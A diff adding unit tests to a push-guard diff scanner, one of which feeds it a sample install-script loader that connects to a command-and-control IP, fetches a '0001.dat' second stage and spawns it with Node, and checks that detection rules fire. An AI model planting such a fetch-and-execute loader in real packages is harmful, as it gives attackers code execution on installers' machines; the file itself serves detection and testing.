@@ -435,6 +435,45 @@ class PushGuardTests(unittest.TestCase):
 
         self.assertEqual([], _scan_diff(diff_text))
 
+    def test_scan_diff_blocks_dprk_socketio_loader_behavior(self):
+        diff_text = "\n".join(
+            [
+                "diff --git a/scripts/install.js b/scripts/install.js",
+                "index 1111111..2222222 100644",
+                "--- a/scripts/install.js",
+                "+++ b/scripts/install.js",
+                "@@ -1,0 +1,5 @@",
+                "+const io = require('socket.io-client');",
+                "+const c2 = 'https://198.51.100.10/api/service';",
+                "+io(c2);",
+                "+fetch(`${c2}/0001.dat`).then(r => r.arrayBuffer());",
+                "+require('child_process').spawn(process.execPath, ['/tmp/0001.dat']);",
+            ]
+        )
+
+        findings = _scan_diff(diff_text)
+        rule_ids = {finding.rule_id for finding in findings}
+
+        self.assertIn("workflow.dprk_socketio_service_fetch", rule_ids)
+        self.assertIn("workflow.dprk_socketio_0001_stage", rule_ids)
+        self.assertIn("workflow.dprk_socketio_node_exec", rule_ids)
+
+    def test_scan_diff_allows_markdown_dprk_socketio_notes(self):
+        diff_text = "\n".join(
+            [
+                "diff --git a/docs/dprk-loader.md b/docs/dprk-loader.md",
+                "index 1111111..2222222 100644",
+                "--- a/docs/dprk-loader.md",
+                "+++ b/docs/dprk-loader.md",
+                "@@ -1,0 +1,3 @@",
+                "+Watch Socket.IO loaders that call /api/service.",
+                "+Some reports mention 0001.dat as a second stage.",
+                "+Node execution after fetch should be investigated.",
+            ]
+        )
+
+        self.assertEqual([], _scan_diff(diff_text))
+
     def test_scan_diff_blocks_astro_config_loader_behavior(self):
         diff_text = "\n".join(
             [
